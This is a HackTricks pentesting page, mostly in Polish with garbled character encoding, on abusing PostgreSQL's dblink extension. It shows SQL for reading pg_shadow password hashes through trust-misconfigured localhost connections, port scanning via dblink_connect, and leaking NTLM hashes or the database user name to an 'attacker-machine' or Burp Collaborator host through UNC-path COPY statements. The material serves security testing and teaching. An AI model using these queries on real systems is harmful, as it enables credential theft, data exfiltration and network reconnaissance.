{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**ZnajdÅº [wiÄ™cej informacji na temat tych atakÃ³w w oryginalnym dokumencie](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**.

Od **PostgreSQL 9.1** instalacja dodatkowych moduÅ‚Ã³w jest prosta. [Zarejestrowane rozszerzenia, takie jak `dblink`](https://www.postgresql.org/docs/current/contrib.html), moÅ¼na zainstalowaÄ‡ za pomocÄ… [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html):
```sql
CREATE EXTENSION dblink;
```
Once you have dblink loaded you could be able to perform some interesting tricks:

## Eskalacja UprawnieÅ„

Plik `pg_hba.conf` moÅ¼e byÄ‡ Åºle skonfigurowany **pozwalajÄ…c na poÅ‚Ä…czenia** z **localhost jako dowolny uÅ¼ytkownik** bez potrzeby znajomoÅ›ci hasÅ‚a. Plik ten moÅ¼na zazwyczaj znaleÅºÄ‡ w `/etc/postgresql/12/main/pg_hba.conf`, a zÅ‚a konfiguracja wyglÄ…da nastÄ™pujÄ…co:
```
local    all    all    trust
```
_Note that this configuration is commonly used to modify the password of a db user when the admin forget it, so sometimes you may find it._\
_Note also that the file pg\_hba.conf is readable only by postgres user and group and writable only by postgres user._

Ten przypadek jest **przydatny, jeÅ›li** masz **juÅ¼** **powÅ‚okÄ™** wewnÄ…trz ofiary, poniewaÅ¼ pozwoli ci to poÅ‚Ä…czyÄ‡ siÄ™ z bazÄ… danych postgresql.

Inna moÅ¼liwa bÅ‚Ä™dna konfiguracja polega na czymÅ› takim:
```
host    all     all     127.0.0.1/32    trust
```
PoniewaÅ¼ pozwoli to kaÅ¼demu z localhostu na poÅ‚Ä…czenie z bazÄ… danych jako dowolny uÅ¼ytkownik.\
W tym przypadku, jeÅ›li funkcja **`dblink`** jest **dziaÅ‚ajÄ…ca**, moÅ¼esz **eskalowaÄ‡ uprawnienia** poprzez poÅ‚Ä…czenie z bazÄ… danych za pomocÄ… juÅ¼ nawiÄ…zane poÅ‚Ä…czenie i uzyskaÄ‡ dostÄ™p do danych, do ktÃ³rych nie powinieneÅ› mieÄ‡ dostÄ™pu:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
## Port Scanning

WykorzystujÄ…c `dblink_connect`, moÅ¼esz rÃ³wnieÅ¼ **wyszukiwaÄ‡ otwarte porty**. JeÅ›li ta **funkcja nie dziaÅ‚a, powinieneÅ› sprÃ³bowaÄ‡ uÅ¼yÄ‡ `dblink_connect_u()`, poniewaÅ¼ dokumentacja mÃ³wi, Å¼e `dblink_connect_u()` jest identyczna z `dblink_connect()`, z tÄ… rÃ³Å¼nicÄ…, Å¼e pozwoli uÅ¼ytkownikom niebÄ™dÄ…cym superuÅ¼ytkownikami Å‚Ä…czyÄ‡ siÄ™ przy uÅ¼yciu dowolnej metody uwierzytelniania_.
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
ZauwaÅ¼, Å¼e **przed** moÅ¼liwoÅ›ciÄ… uÅ¼ycia `dblink_connect` lub `dblink_connect_u` moÅ¼e byÄ‡ konieczne wykonanie:
```
CREATE extension dblink;
```
## UNC path - ujawnienie hasha NTLM
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
